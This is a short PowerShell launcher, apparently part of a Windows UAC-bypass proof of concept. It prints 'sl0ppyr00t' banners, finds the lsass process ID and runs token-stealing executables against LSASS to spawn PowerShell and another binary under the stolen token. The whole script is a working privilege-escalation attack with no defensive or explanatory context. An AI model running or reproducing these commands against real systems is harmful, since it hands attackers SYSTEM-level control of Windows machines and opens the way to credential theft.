Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host " {sl0p}Lsass Impersonation{sl0p}"
Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host ""
Write-Host ""
cd -Path 'C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-TokenStealer' -PassThru
Write-Host ""
Write-Host ""
$i = get-process lsass |select -expand id 
#./sl0ppyTI.exe pid:$i binary:C:\windows\system32\cmd.exe
powershell ./sl0ppyTI.exe pid:$i binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
sleep 5 
$i = get-process lsass |select -expand id
powershell ./sl0ppy-ntauth.exe pid:$i binary:C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-ntc.exe 

